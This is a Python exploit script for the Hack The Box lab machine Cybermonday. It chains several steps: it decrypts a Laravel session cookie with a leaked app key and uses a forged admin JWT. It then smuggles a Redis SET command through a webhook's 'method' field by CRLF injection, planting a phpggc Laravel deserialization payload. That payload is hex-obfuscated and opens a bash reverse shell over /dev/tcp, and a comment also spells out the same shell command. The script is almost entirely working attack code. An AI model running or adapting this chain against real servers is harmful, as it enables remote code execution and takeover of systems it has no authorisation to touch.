#!/usr/bin/env python3

'''
HTB Cybermonday
---------------
Description: Container access by Redis as session storage (laravel/serialization/rce)
Author: Marss
Date: 10 Nov, 2023
'''

import hmac

from Crypto.Cipher import AES
from base64 import b64decode
from json import loads
from hashlib import sha256
from random import choices
from re import findall
from requests import Session
from requests.exceptions import ConnectionError, ConnectTimeout
from signal import signal, SIGINT
from string import ascii_letters

import pdb

# Ctrl + C
signal(SIGINT, lambda signum, frame: exit('\n[!] User aborted.'))

# Main class
class Exploit:

    get_rand_str = lambda self, length: ''.join(choices(ascii_letters, k=length))
    
    def __init__(self):
        
        self.target = {
            'base_url':'http://cybermonday.htb',
            'webhook': 'http://webhooks-api-beta.cybermonday.htb'
        }
        self.temp_data = self.get_rand_str(5)
        self.app_key = b64decode('EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=')
        # You need to change this:
        # JWT editor (Burpsuite extension)
        self.signed_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJtYXJzcyIsInJvbGUiOiJhZG1pbiJ9.3O-gYFD9-byFP4HeFtPEKzni8pZVooa-WziKg3r-NIo"
        # phpggc -A Laravel/RCE10 system "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"
        # escape \ and "
        self.serialized_payload = 'O:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{S:9:\"\\63\\6f\\6e\\64\\69\\74\\69\\6f\\6e\";a:2:{i:0;O:28:\"Illuminate\\Auth\\RequestGuard\":3:{S:8:\"\\63\\61\\6c\\6c\\62\\61\\63\\6b\";S:14:\"\\63\\61\\6c\\6c\\5f\\75\\73\\65\\72\\5f\\66\\75\\6e\\63\";S:7:\"\\72\\65\\71\\75\\65\\73\\74\";S:6:\"\\73\\79\\73\\74\\65\\6d\";S:8:\"\\70\\72\\6f\\76\\69\\64\\65\\72\";S:51:\"\\62\\61\\73\\68\\20\\2d\\63\\20\\27\\62\\61\\73\\68\\20\\2d\\69\\20\\3e\\26\\20\\2f\\64\\65\\76\\2f\\74\\63\\70\\2f\\31\\30\\2e\\31\\30\\2e\\31\\35\\2e\\31\\32\\2f\\34\\34\\34\\34\\20\\30\\3e\\26\\31\\27\";}i:1;S:4:\"\\75\\73\\65\\72\";}}'

        # Session
        self.session = Session()

    def run(self):
        try:
            if self.target_response():
                self.register()
                self.send_redis_injection()

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def target_response(self) -> bool:

        try:
            response = self.session.get(self.target['base_url'], timeout=5)

            if response.ok:
                print('\n[+] Target up.')
            
            return response.ok

        except ConnectTimeout:
            exit('\n[!] Verify VPN connection.')
        except ConnectionError:
            exit(f'\n[x] Can\'t resolve {self.target["base_url"]}')

    def get_signup_token(self) -> str:

        response = self.session.get(self.target['base_url'] + '/signup')

        return findall(r'"_token"\s+value="(.*)"', response.text)[0]

    def register(self):
        
        post_data = {
            '_token': self.get_signup_token(),
            'username': self.temp_data,
            'email': '{0}@{0}.{0}'.format(self.temp_data),
            'password': self.temp_data
        }

        self.session.post(self.target['base_url'] + '/signup', data=post_data)

        self.cookie_session = self.session.cookies.get_dict()['cybermonday_session'].replace('%3D','=')

    def mcrypt_decrypt(self, value, iv):
        
        AES.key_size = [len(self.app_key)]
        crypt_object = AES.new(key=self.app_key, mode=AES.MODE_CBC, IV=iv)
        return crypt_object.decrypt(value)

    def decrypt(self, bstring):
        
        dic = loads(b64decode(bstring).decode())
        mac = dic['mac']
        value = bytes(dic['value'], 'utf-8')
        iv = bytes(dic['iv'], 'utf-8')
        if mac == hmac.new(self.app_key, iv+value, sha256).hexdigest():
            return self.mcrypt_decrypt(b64decode(value), b64decode(iv))
        return ''

    def get_session_id(self) -> str:

        session_decrypted = self.decrypt(self.cookie_session).decode()
        
        return findall(r'\|(.*?)\x0f', session_decrypted)[0]

    def create_webhook(self, mode: str) -> str:

        headers = { 'x-access-token':self.signed_jwt }
        post_data = {
            "name": self.temp_data,
            "description": self.temp_data,
            "action": mode
        }

        response = self.session.post(self.target['webhook'] + '/webhooks/create',
            headers=headers,
            json=post_data)
        
        return loads(response.text)['webhook_uuid']

    def send_redis_injection(self):

        session = self.get_session_id()
        webhook_uuid = self.create_webhook(mode='sendRequest')

        post_data = {
            "url": "http://redis:6379/",
            "method": f"SET laravel_session:{session} '{self.serialized_payload}'\r\n"
        }

        response = self.session.post(self.target['webhook'] + f'/webhooks/{webhook_uuid}',
            json=post_data)

        self.session.get(self.target['base_url'] + '/home')

if __name__ == '__main__':

    title = '\n| HTB Cybermonday (www-data) |'
    
    print(title)
    
    exploit = Exploit()
    exploit.run()